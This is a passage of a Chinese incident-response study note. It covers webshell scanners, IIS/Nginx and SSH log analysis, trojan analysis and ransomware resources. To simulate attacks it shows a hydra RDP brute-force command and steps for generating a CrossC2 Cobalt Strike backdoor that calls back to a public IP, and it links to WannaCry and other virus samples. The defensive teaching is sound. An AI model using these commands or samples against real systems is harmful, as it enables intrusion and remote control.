alt="img"></p><p>&lt;8&gt;还可以去网站目录查看首页修改时间，查找网站相关日志，定位修改时间基数，将该时间之前的日志进行攻击分析（分析攻击者是如何修改首页内容的），该时间之后的日志进行操作分析（分析攻击者修改网页之后还进行了什么操作，是否留有后门等）</p><p>&lt;9&gt;利用后门webshell查杀脚本或工具找到对应后门文件，网上有很多查杀工具，比如D盾_Web查杀、百度WEBDIR+、河马、Sangfor WebShellKill、深度学习模型检测PHP Webshell、PHP Malware Finder、在线webshell查杀工具等。</p><blockquote><p>参考：<a href="https://blog.csdn.net/qq_25645753/article/details/110196602">应急响应之Webshell查杀工具</a></p></blockquote><p>比如使用河马查杀，安装之后，扫描，发现两个后门。然后去日志搜索相关关键字，找到是谁访问了这个后门，如何操作等。</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210190135814.png" alt="img"></p><h2 id="案例3：WIN系统攻击应急溯源-后门-日志-流量"><a href="#案例3：WIN系统攻击应急溯源-后门-日志-流量" class="headerlink" title="案例3：WIN系统攻击应急溯源-后门,日志,流量"></a>案例3：WIN系统攻击应急溯源-后门,日志,流量</h2><blockquote><p>分析：涉及的攻击面，涉及的操作权限，涉及的攻击意图，涉及的攻击方式等</p><p>故事回顾：某客户反映服务器出现卡顿等情况，请求支援</p><p>思路：利用<strong>监控工具分析可疑进程</strong>，利用<strong>杀毒软件分析可疑文件</strong>，利用<strong>接口工具抓流量</strong></p><ul><li>获取进程监控：<a href="http://www.xuetr.com/">PCHunter64</a></li></ul><blockquote><p>获取进程监控，蓝色表示非系统进程</p></blockquote><ul><li>获取进程执行列表：<a href="https://www.onlinedown.net/soft/628964.htm">UserAssistView</a></li></ul><blockquote><p>获取所有在Windows上执行过的进程的记录，根据恶意进程文件路径或者是事件发生的大概时间范围去定位攻击者的操作</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210190236861.png" alt="image-20221019023633532"></p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AppCompatCacheParser.exe --csv c:\temp -t</span><br></pre></td></tr></table></figure><p>定位到恶意软件后，可以结合杀毒软件进行排查，如果有免杀也不要紧，不可能免杀所有杀软，放到在线的世界杀毒网或者其他沙箱里去跑跑</p></blockquote><p>案例演示</p><p>&lt;1&gt;打开PCHunter64工具，查看正在运行的进程，发现异常进程artifact.exe（名字不熟悉，没有厂商信息等）</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210190135235.png" alt="img" style="zoom:50%;" /><p>&lt;2&gt;在网络模块，发现该进程与外部IP地址进行网络连接，很可疑。</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210190135252.png" alt="img" style="zoom:50%;" /><p>&lt;3&gt;PCHunter64工具还有很多其他功能，可以进一步分析该进程是否是后门或者勒索病毒等。</p><p>&lt;4&gt;UserAssistView工具可以看到windows系统所有文件的执行时间记录，比如我们可以查看一下artifact.exe上次修改的时间。说明在这个时间点前后攻击者一定对系统进行了一些操作，相应地，<strong>我们就可以以此时间为基数，定位查找日志将该时间之前的日志进行攻击分析（分析攻击者是如何攻击服务器的），该时间之后的日志进行操作分析（分析攻击者登录服务器后进行了什么操作)</strong></p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210190135434.png" alt="img" style="zoom:50%;" /><h1 id="WEB分析php-amp-javaweb-amp-自动化工具-应急响应"><a href="#WEB分析php-amp-javaweb-amp-自动化工具-应急响应" class="headerlink" title="WEB分析php&amp;javaweb&amp;自动化工具 - 应急响应"></a>WEB分析php&amp;javaweb&amp;自动化工具 - 应急响应</h1><h2 id="一、应急响应过程"><a href="#一、应急响应过程" class="headerlink" title="一、应急响应过程"></a>一、应急响应过程</h2><blockquote><p>目的：分析攻击时间、攻击操作、攻击结果、安全修复等并给出合理的解决方案 </p><p>保护阶段：直接断网，保护现场，看是否能够恢复数据 </p><p>分析阶段：对入侵过程进行分析，常见方法为指纹库搜索、日志时间分析、后门追查分析、漏洞检查分析等 </p><p>复现阶段：还原攻击过程，模拟攻击者入侵思路，关注攻击者在系统中应用的漏洞、手法 </p><p>修复阶段：分析原因后，修补相关系统、应用漏洞，如果存在后门或弱口令，及时清除并整改 </p><p>建议阶段：对攻击者利用的漏洞进行修补，加强系统安全同时提高安全意识</p></blockquote><h2 id="二、必备知识点"><a href="#二、必备知识点" class="headerlink" title="二、必备知识点"></a>二、必备知识点</h2><blockquote><p>1、熟悉常用的web安全攻击技术 </p><p>2、熟悉相关<strong>日志启用</strong>以及<strong>存储查看</strong>等 </p><p>3、熟悉<strong>日志中记录数据分类和分析</strong>等</p></blockquote><h2 id="三、准备工作"><a href="#三、准备工作" class="headerlink" title="三、准备工作"></a>三、准备工作</h2><blockquote><p>1、收集目标服务器信息 </p><p>2、部署相关分析软件和平台等 </p><p>3、整理相关安全渗透测试工具指纹库（根据这个判断攻击者用什么以什么方式打进来）</p><p>4、针对异常表现第一时间触发思路 </p></blockquote><p>从受害方提供的信息预估入侵面以及权限面进行排查，分为<strong>有明确信息和无明确信息</strong>两种情况：</p><p>1、如果有明确信息的情况下，基本上会提出关于时间、操作以及指纹这一类的相关信息</p><ul><li>基于时间：如果受害方提供了文件被修改日期、异常登录日期，那么我们就可以锁定这一时期的相关日志进行查看，不必去大海捞针一天天地看日志了。从而有针对性地对目标攻击事件进行分析。</li><li>基于操作：如果受害方提供了被删除、被加密的数据、文件位置，如数据库、磁盘等，那么我们可以根据攻击者的操作判断它入侵了哪些地方并可能分析出攻击过程。</li><li>基于指纹：如果受害方只说是网页被修改、网站被上马，那么我们可以根据攻击工具的指纹、木马的指纹、病毒的指纹、修改的内容等判断攻击者使用了何种工具、处于何种技术水平。</li><li>其他</li></ul><p>2、如果无明确信息的情况下，那么就需要排查全部可能入侵的手法（进行入侵排查）：</p><ul><li>web漏洞：检查源码类别和漏洞情况</li><li>中间件漏洞：检查对应版本和漏洞情况</li><li>第三方应用漏洞：检查是否存在漏洞应用</li><li>操作系统漏洞：检查是否存在系统漏洞</li><li>其他安全问题：检查相关用户口令以及后门扫描</li></ul><h2 id="四、演示案例"><a href="#四、演示案例" class="headerlink" title="四、演示案例"></a>四、演示案例</h2><h3 id="（一）windows-IIS-SQL-日志搜索"><a href="#（一）windows-IIS-SQL-日志搜索" class="headerlink" title="（一）windows+IIS+SQL - 日志搜索"></a>（一）windows+IIS+SQL - 日志搜索</h3><blockquote><p>故事回顾：某小企业反应自己的网站出现异常，请求支援</p><p>思路：进入网站服务器，通过配置文件找到网站日志目录，打开日志，搜索分析</p></blockquote><p>1、查询IIS日志文件存放位置</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210190437206.png" alt="image-20221019043719897" style="zoom:50%;" /><blockquote><p>注意在这个地方，可以修改日志显示哪一些字段，可以显示的更加完善：</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210190447516.png" alt="image-20221019044752234" style="zoom:50%;" /></blockquote><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210190119109.png" alt="图片" style="zoom:50%;" /><p>2、根据网站的ID号寻找对应的日志</p><blockquote><p>一般IIS日志目录下面有很多的日志，要根据ID找到对应的日志</p></blockquote><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210190119053.png" alt="图片" style="zoom:50%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210190119161.png" alt="图片" style="zoom:50%;" /><p>3、找到日志后查看攻击语句</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210190441766.png" alt="image-20221019044118948"></p><p>4、根据指纹判断攻击所采用的了何种攻击，搜索一些日志中常见关键词</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210190449935.png" alt="image-20221019044958092" style="zoom:50%;" /><h3 id="（二）linux-BT-Nginx-tp5日志后门"><a href="#（二）linux-BT-Nginx-tp5日志后门" class="headerlink" title="（二）linux+BT+Nginx+tp5日志后门"></a>（二）linux+BT+Nginx+tp5日志后门</h3><blockquote><p>BT&#x3D;宝塔，tp5&#x3D;thinkphp5</p></blockquote><blockquote><p>故事回顾：某黑x哥哥反应自己的网站出现异常，请求支援</p></blockquote><p>1、在宝塔面板中下载日志至本地</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210190119080.png" alt="图片" style="zoom:67%;" /><p>2、分析日志，查看工具指纹和攻击请求IP，锁定攻击IP</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210191959802.png" alt="img" style="zoom:50%;" /><p>3、或者使用宝塔自带后门查杀</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210191959452.png" alt="img" style="zoom:50%;" /><h3 id="（三）360星图日志自动分析工具-简单分析日志"><a href="#（三）360星图日志自动分析工具-简单分析日志" class="headerlink" title="（三）360星图日志自动分析工具-简单分析日志"></a>（三）360星图日志自动分析工具-简单分析日志</h3><blockquote><p>简单教程：<a href="https://www.cnsrc.org.cn/loganalysis/12.html">360星图网站日志分析工具</a></p></blockquote><blockquote><ul><li>只支持apache、iis、nginx</li><li>需配置conf中日志存储位置，配置好后start即可</li></ul></blockquote><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210190119220.png" alt="图片" style="zoom:50%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210190119205.png" alt="图片" style="zoom:50%;" /><p>其他好用的工具还有<strong>ELK、Splunk</strong>、FileSeek。</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210190119344.png" alt="图片" style="zoom:50%;" /><h2 id="web日志分析工具"><a href="#web日志分析工具" class="headerlink" title="web日志分析工具"></a>web日志分析工具</h2><p>除了360星图外还有很多工具，其中ELK和Splunk部署相对比较麻烦。ELK、Splunk基本是蓝队必备，迪哥推荐FileSeek</p><blockquote><ul><li>360星图（已下架）</li><li><strong>ELK</strong></li></ul><blockquote><p>开源实时日志分析的ELK平台，由ElasticSearch、Logstash和Kiabana三个开源项目组成，在企业级日志管理平台中十分常见。<br>下载使用：<a href="https://www.elastic.co/cn/elastic-stack">https://www.elastic.co/cn/elastic-stack</a></p></blockquote><ul><li><strong>Splunk</strong></li></ul><blockquote><p>一款顶级的日志分析软件，如果你经常用 grep、awk、sed、sort、uniq、tail、head 来分析日志，那么你可以很容易地过渡到Splunk。<br>下载地址：<a href="https://www.splunk.com/zh-hans_cn/download/splunk-enterprise.html">https://www.splunk.com/zh-hans_cn/download/splunk-enterprise.html</a></p></blockquote><ul><li>FileSeek：<a href="https://www.ghxi.com/fileseek.html">https://www.ghxi.com/fileseek.html</a></li><li><strong>FinderWeb</strong></li></ul><blockquote><p>程序员的看日志利器，支持,tail, less, grep，支持超大的文本文件，从几M到几十G的日志文件都流畅自如。<br>下载使用：<a href="http://www.finderweb.net/download.html">http://www.finderweb.net/download.html</a></p></blockquote><ul><li><strong>web-log-parser</strong></li></ul><blockquote><p>一款开源的分析web日志工具，采用python语言开发，具有灵活的日志格式配置。<br>github项目地址：<a href="https://github.com/JeffXue/web-log-parser">https://github.com/JeffXue/web-log-parser</a></p></blockquote></blockquote><blockquote><p>更多工具见下方链接</p></blockquote><h2 id="webshell查杀工具"><a href="#webshell查杀工具" class="headerlink" title="webshell查杀工具"></a>webshell查杀工具</h2><blockquote><ul><li>D盾_Web查杀：</li></ul><blockquote><p>阿D出品，使用自行研发不分扩展名的代码分析引擎，能分析更为隐藏的WebShell后门行为。<br>兼容性：只提供Windows版本。</p><p><a href="http://www.d99net.net/index.asp">http://www.d99net.net/index.asp</a></p></blockquote><ul><li>河马webshell查杀：</li></ul><blockquote><p>专注webshell查杀研究，拥有海量webshell样本和自主查杀技术，采用传统特征+云端大数据双引擎的查杀技术。查杀速度快、精度高、误报低。<br>兼容性：支持Windows、linux，支持在线查杀。</p><p><a href="http://www.shellpub.com/">http://www.shellpub.com</a></p></blockquote><ul><li><p>深信服Webshell网站后门检测工具：<a href="http://edr.sangfor.com.cn/backdoor_detection.html">http://edr.sangfor.com.cn/backdoor_detection.html</a></p></li><li><p>Safe3：<a href="http://www.uusec.com/webshell.zip">http://www.uusec.com/webshell.zip</a></p></li><li><p>Web Shell Detector</p></li></ul><blockquote><p>Webshell Detector具有“ Webshell”签名数据库，可帮助识别高达99％的“ Webshell”。<br>兼容性：提供php&#x2F;python脚本，可跨平台，在线检测。<br>官方网站：<a href="http://www.shelldetector.com/">http://www.shelldetector.com/</a><br>github项目地址：<a href="https://github.com/emposha/PHP-Shell-Detector">https://github.com/emposha/PHP-Shell-Detector</a></p></blockquote><ul><li>在线webshell查杀工具</li></ul><blockquote><p>在线查杀地址：<a href="http://tools.bugscaner.com/killwebshell/">http://tools.bugscaner.com/killwebshell/</a></p></blockquote></blockquote><h1 id="操作系统分析（病毒、后门）-应急响应"><a href="#操作系统分析（病毒、后门）-应急响应" class="headerlink" title="操作系统分析（病毒、后门）- 应急响应"></a>操作系统分析（病毒、后门）- 应急响应</h1><blockquote><ol><li>常见危害：暴力破解，漏洞利用，流量攻击，木马控制(Webshe11,Pc木马等)，病毒感染（挖矿，蠕虫，勒索等）。</li><li>常见分析：计算机账户，端口，进程，网络，启动项，异常服务，任务（异常定时任务执行），文件（异常文件，如后门、病毒、木马）等安全问题</li></ol></blockquote><h2 id="常见日志类别及存储"><a href="#常见日志类别及存储" class="headerlink" title="常见日志类别及存储"></a>常见日志类别及存储</h2><h3 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h3><p>事件查看器&gt;windows日志（包括应用程序、安全、Setup、系统、事件）</p><h3 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /var/log</span><br></pre></td></tr></table></figure><h2 id="实战案例"><a href="#实战案例" class="headerlink" title="实战案例"></a>实战案例</h2><h3 id="（一）攻击响应-暴力破解-RDP、SSH"><a href="#（一）攻击响应-暴力破解-RDP、SSH" class="headerlink" title="（一）攻击响应-暴力破解(RDP、SSH)"></a>（一）攻击响应-暴力破解(RDP、SSH)</h3><h4 id="通过kali模拟攻击对rdp服务进行暴力破解"><a href="#通过kali模拟攻击对rdp服务进行暴力破解" class="headerlink" title="通过kali模拟攻击对rdp服务进行暴力破解"></a>通过kali模拟攻击对rdp服务进行暴力破解</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hydra -l mac -P /usr/share/wordlists/metasploit/password.lst rdp://172.16.54.42 -s 3389 -vV</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210190119137.png" alt="图片" style="zoom:50%;" /><h5 id="图形化界面查看RDP爆破的日志"><a href="#图形化界面查看RDP爆破的日志" class="headerlink" title="图形化界面查看RDP爆破的日志"></a>图形化界面查看RDP爆破的日志</h5><blockquote><p>在win系统中需开启审核策略（成功、失败），同时查看windows日志，关注事件归类、事件ID、事件状态等</p></blockquote><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210190119157.png" alt="图片" style="zoom:50%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210190119111.png" alt="图片" style="zoom:50%;" /><p>可以发现爆破账户为mac，黑客主机名为kali</p><h5 id="工具查看RDP爆破日志"><a href="#工具查看RDP爆破日志" class="headerlink" title="工具查看RDP爆破日志"></a>工具查看RDP爆破日志</h5><blockquote><p>LogFusion</p><blockquote><p><a href="https://www.xzji.com/news/4806.html">LogFusion Pro系统日志监控软件安装激活教程</a></p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Windows-LogFusion 载入查看：</span><br><span class="line">事件归类，事件 ID，事件状态等，参考百度资料</span><br></pre></td></tr></table></figure></blockquote><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210210602936.png" alt="image-20221021060255440"></p><h4 id="对SSH进行爆破-查看日志（Centos为例）"><a href="#对SSH进行爆破-查看日志（Centos为例）" class="headerlink" title="对SSH进行爆破 查看日志（Centos为例）"></a>对SSH进行爆破 查看日志（Centos为例）</h4><ol start="0"><li>先用工具对ssh进行爆破</li></ol><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210202155683.png" alt="image-20221020215524120" style="zoom:50%;" /><p>可以看到爆破前的日志：</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210202220277.png" alt="image-20221020222036934"></p><p>开始估计后查看日志：</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210210048405.png" alt="image-20221021004819022"></p><p>1、统计了下日志，确认服务器遭受多少次暴力破解</p><blockquote><p><code>grep</code>命令筛选：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-o <span class="comment"># 只输出文件中匹配到的部分。</span></span><br><span class="line">-E --extended-regexp             <span class="comment"># 将范本样式为延伸的普通表示法来使用，意味着使用能使用扩展正则表达式。</span></span><br><span class="line">-e&lt;范本样式&gt; --regexp=&lt;范本样式&gt;   <span class="comment"># 指定字符串作为查找文件内容的范本样式。</span></span><br></pre></td></tr></table></figure><p><code>uniq</code>命令：报告或忽略文件中的重复行</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-c或——count：<span class="comment">#在每列旁边显示该行重复出现的次数；</span></span><br></pre></td></tr></table></figure></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grep -o &quot;Failed password&quot; /var/log/secure|uniq -c </span><br></pre></td></tr></table></figure><p>2、输出登录爆破的第一行和最后一行，确认爆破时间范围</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grep &quot;Failed password&quot; /var/log/secure|head -1 </span><br><span class="line">grep &quot;Failed password&quot; /var/log/secure|tail -1 </span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210210049703.png" alt="image-20221021004921433"></p><p>3、进一步定位有哪些 IP 在爆破？</p><blockquote><p><code>sort</code>命令：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-n：依照数值的大小排序；</span><br><span class="line">-r：以相反的顺序来排序；</span><br></pre></td></tr></table></figure></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grep &quot;Failed password&quot; /var/log/secure|grep -E -o &quot;(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[04][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][09]?)&quot;|uniq -c | sort -nr </span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210210049335.png" alt="image-20221021004946069"></p><p>4、爆破用户名字典都有哪些？</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grep &quot;Failed password&quot; /var/log/secure|perl -e &#x27;while($_=&lt;&gt;)&#123; /for(.*?) from/; print &quot;$1\n&quot;;&#125;&#x27;|uniq -c|sort -nr </span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210210050566.png" alt="image-20221021005024287"></p><p>5、登录成功的日期、用户名、IP</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">登录成功日期、用户名、IP</span></span><br><span class="line">grep &quot;Accepted &quot; /var/log/secure | awk &#x27;&#123;print $1,$2,$3,$9,$11&#125;&#x27; </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">去重后的</span></span><br><span class="line">grep &quot;Accepted &quot; /var/log/secure | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c | sort -nr | more</span><br></pre></td></tr></table></figure><h3 id="（二）控制响应-后门木马（webshell、PC）"><a href="#（二）控制响应-后门木马（webshell、PC）" class="headerlink" title="（二）控制响应-后门木马（webshell、PC）"></a>（二）控制响应-后门木马（webshell、PC）</h3><blockquote><p>实战可以借助杀软查找木马，没杀软的话用工具：</p><ul><li>Windows自带的<code>SysinternalsSuite</code>工具很好用：</li></ul><blockquote><ul><li><code>TCPview</code>分析网络进程指向（实际上不太推荐，因为有的看不到，不过也挺好用的）</li><li><code>Procexp64</code>好用，全称是<code>process explorer</code>，</li></ul></blockquote><ul><li><code>PChunter</code></li></ul><blockquote><p>比较难受的是授权码，到期时间不好搞，而且高一点版本的就不适用了驱动加载失败，我的win10不行，，不过据说是一个好用的老工具</p><p>功能在windows高版本网络信息获取不全（win2012及以上）</p></blockquote><ul><li><code>火绒剑</code>- 推荐</li></ul></blockquote><h4 id="Windows木马分析"><a href="#Windows木马分析" class="headerlink" title="Windows木马分析"></a>Windows木马分析</h4><p>cs的木马在没有伪造之前可以很清楚的看到信息缺失</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210210205535.png" alt="image-20221021020501057"></p><p>网络的信息有缺失，讲真的<code>PChunter</code>比较拉跨</p><h4 id="linux——cs木马上线分析："><a href="#linux——cs木马上线分析：" class="headerlink" title="linux——cs木马上线分析："></a>linux——cs木马上线分析：</h4><blockquote><p>借助 CrossC2 项目上线Linux，geacon也可以上线Linux</p><a href="/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Attack/CobaltStrike/0x17-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6Cobalt-Strike.html" title="0x17 - 渗透测试框架Cobalt Strike">0x17 - 渗透测试框架Cobalt Strike</a></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netstat -ntulp </span><br></pre></td></tr></table></figure><ol><li>项目上传至CS服务端目录，给予执行权限</li></ol><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210220725964.png" alt="img" style="zoom:50%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210220726157.png" alt="img" style="zoom: 80%;" /></p><ol start="2"><li>配置监听器：监听器为windows&#x2F;beacon_https&#x2F;reverse_https 注：如果是阿里云记得端口放行，同时需要关闭linux默认防火墙</li></ol><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210220726862.png" alt="img" style="zoom:50%;" /><ol start="3"><li>生成后门：</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./genCrossC2.Linux 47.99.49.65 5566 null null Linux x64 C2 </span><br></pre></td></tr></table></figure><ol start="4"><li><p>将后门上传到linux主机并执行上线</p></li><li><p>通过网络监听工具及 windows 日志分析或执行记录查找后门问题</p></li></ol><h3 id="（三）危害响应-病毒感染-勒索-WannaCry-Windows"><a href="#（三）危害响应-病毒感染-勒索-WannaCry-Windows" class="headerlink" title="（三）危害响应-病毒感染(勒索 WannaCry)-Windows"></a>（三）危害响应-病毒感染(勒索 WannaCry)-Windows</h3><blockquote><p>勒索病毒一定要小心</p></blockquote><blockquote><p>详细说明中毒表现及恢复指南</p><p>勒索病毒解密：<a href="https://lesuobingdu.360.cn/">https://lesuobingdu.360.cn/</a> </p><p>另一个尝试解密的网站：<a href="https://www.nomoreransom.org/zh/index.html">https://www.nomoreransom.org/zh/index.html</a></p><p>该网站会监测病毒的类型然后提供一些解密软件（各种解密软件，有官方亦或者民间大神的），一个个试吧~</p><p>[下载]永恒之蓝样本（勒索病毒）： <a href="https://bbs.pediy.com/thread-217586-1.htm">https://bbs.pediy.com/thread-217586-1.htm</a></p></blockquote><h2 id="涉及资源："><a href="#涉及资源：" class="headerlink" title="涉及资源："></a>涉及资源：</h2><blockquote><p><a href="https://xz.aliyun.com/t/485">https://xz.aliyun.com/t/485</a> </p><p><a href="https://lesuobingdu.360.cn/">https://lesuobingdu.360.cn/</a> </p><p><a href="https://bbs.pediy.com/thread-217586-1.htm">https://bbs.pediy.com/thread-217586-1.htm</a> </p><p><a href="https://www.nomoreransom.org/zh/index.html">https://www.nomoreransom.org/zh/index.html</a> </p><p><a href="https://docs.microsoft.com/en-us/sysinternals/">https://docs.microsoft.com/en-us/sysinternals/</a> </p><p><a href="https://www.secpulse.com/archives/114019.html">https://www.secpulse.com/archives/114019.html</a> </p><p>#网盘链接 失效不补，这里面有小迪的病毒样本，要小心操作</p><p><a href="https://pan.baidu.com/s/1tQS1mUelmEh3I68AL7yXGg">https://pan.baidu.com/s/1tQS1mUelmEh3I68AL7yXGg</a> 提取码：xiao</p></blockquote><h2 id="windows应急响应工具"><a href="#windows应急响应工具" class="headerlink" title="windows应急响应工具"></a>windows应急响应工具</h2><blockquote><h3 id="进程分析："><a href="#进程分析：" class="headerlink" title="进程分析："></a><strong>进程分析：</strong></h3><ul><li>获取进程执行列表：<a href="https://www.onlinedown.net/soft/628964.htm">UserAssistView</a></li></ul><blockquote><p>获取所有在Windows上执行过的进程的记录，根据恶意进程文件路径或者是事件发生的大概时间范围去定位攻击者的操作</p></blockquote><p>实战可以借助杀软查找木马，没杀软的话用工具：</p><ul><li>Windows自带的<code>SysinternalsSuite</code>工具很好用：</li></ul><blockquote><ul><li><code>TCPview</code><strong>分析网络</strong>进程指向（实际上不太推荐，因为有的看不到，不过也挺好用的）</li><li><code>Procexp64</code>好用，全称是<code>process explorer</code>，用于<strong>分析进程</strong></li><li><code>Logonsessions</code>查看哪些用户<strong>连接过主机</strong>，需要有管理员权限</li></ul><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210210520225.png" alt="image-20221021052000751" style="zoom:50%;" /><ul><li><code>Autoruns</code>检查Windows上面的<strong>启动项、服务、计划任务</strong></li></ul></blockquote><ul><li><code>PChunter</code></li></ul><blockquote><p>比较难受的是授权码，到期时间不好搞，而且高一点版本的就不适用了驱动加载失败，我的win10不行，，不过据说是一个好用的老工具</p><p>功能在windows高版本网络信息获取不全（win2012及以上）</p></blockquote><ul><li><code>火绒剑</code>- 推荐</li></ul><blockquote><p>一款用于分析、处理恶意程序的安全工具软件，提供了“程序行为监控”、“进程管理”、“文件管理”、“注册表管理”、“系统启动项管理”、”内核程序管理“、“代码钩子扫描”七大功能：</p></blockquote><ul><li>LastActivityView</li></ul><blockquote><p>是一款电脑操作记录查看器，直接调用系统日志，显示安装软件、系统启动、关机、网络连接、执行exe 的发生时间和路径：</p><p>下载地址：<a href="http://www.nirsoft.net/utils/computer_activity_view.html">http://www.nirsoft.net/utils/computer_activity_view.html</a></p></blockquote><ul><li>Process Hacker</li></ul><blockquote><p>一款功能丰富的开源系统进程辅助工具，可以方便的查看进程的运行情况、内存以及模块信息，还可以对进程进行管理</p><p>下载地址：<a href="https://www.jishuwen.com/jump/aHR0cHM6Ly9wc**jZXNzaGFja2VyLnNvdXJjZWZvcmdlLmlvLw==">https://processhacker.sourceforge.io/</a></p></blockquote><h3 id="其他工具："><a href="#其他工具：" class="headerlink" title="其他工具："></a>其他工具：</h3></blockquote><h2 id="Linux应急响应工具"><a href="#Linux应急响应工具" class="headerlink" title="Linux应急响应工具"></a>Linux应急响应工具</h2><h4 id="自动化响应监测-Gscan多重功能脚本测试-Linux"><a href="#自动化响应监测-Gscan多重功能脚本测试-Linux" class="headerlink" title="自动化响应监测-Gscan多重功能脚本测试-Linux"></a>自动化响应监测-Gscan多重功能脚本测试-Linux</h4><blockquote><p>（还是比较nb的一款自动化运维工具）</p></blockquote><blockquote><p>具体操作指南看GitHub的readme： <a href="https://github.com/grayddq/GScan">GScan v0.1</a></p><p>本程序旨在为安全应急响应人员对Linux主机排查时提供便利，实现主机侧Checklist的自动全面化检测，根据检测结果自动数据聚合，进行黑客攻击路径溯源。</p><h4 id="自动化程序的CheckList项如下："><a href="#自动化程序的CheckList项如下：" class="headerlink" title="自动化程序的CheckList项如下："></a>自动化程序的CheckList项如下：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、主机信息获取</span><br><span class="line">2、系统初始化alias检查</span><br><span class="line">3、文件类安全扫描</span><br><span class="line">  3.1、系统重要文件完整行扫描</span><br><span class="line">  3.2、系统可执行文件安全扫描</span><br><span class="line">  3.3、临时目录文件安全扫描</span><br><span class="line">  3.4、用户目录文件扫描</span><br><span class="line">  3.5、可疑隐藏文件扫描</span><br><span class="line">4、各用户历史操作类</span><br><span class="line">  4.1、境外ip操作类</span><br><span class="line">  4.2、反弹shell类</span><br><span class="line">5、进程类安全检测</span><br><span class="line">  5.1、CUP和内存使用异常进程排查</span><br><span class="line">  5.2、隐藏进程安全扫描</span><br><span class="line">  5.3、反弹shell类进程扫描</span><br><span class="line">  5.4、恶意进程信息安全扫描</span><br><span class="line">  5.5、进程对应可执行文件安全扫描</span><br><span class="line">6、网络类安全检测</span><br><span class="line">  6.1、境外IP链接扫描</span><br><span class="line">  6.3、恶意特征链接扫描</span><br><span class="line">  6.4、网卡混杂模式检测</span><br><span class="line">7、后门类检测</span><br><span class="line">  7.1、LD_PRELOAD后门检测</span><br><span class="line">  7.2、LD_AOUT_PRELOAD后门检测</span><br><span class="line">  7.3、LD_ELF_PRELOAD后门检测</span><br><span class="line">  7.4、LD_LIBRARY_PATH后门检测</span><br><span class="line">  7.5、ld.so.preload后门检测</span><br><span class="line">  7.6、PROMPT_COMMAND后门检测</span><br><span class="line">  7.7、Cron后门检测</span><br><span class="line">  7.8、Alias后门</span><br><span class="line">  7.9、SSH 后门检测</span><br><span class="line">  7.10、SSH wrapper 后门检测</span><br><span class="line">  7.11、inetd.conf 后门检测</span><br><span class="line">  7.12、xinetd.conf 后门检测</span><br><span class="line">  7.13、setUID 后门检测</span><br><span class="line">  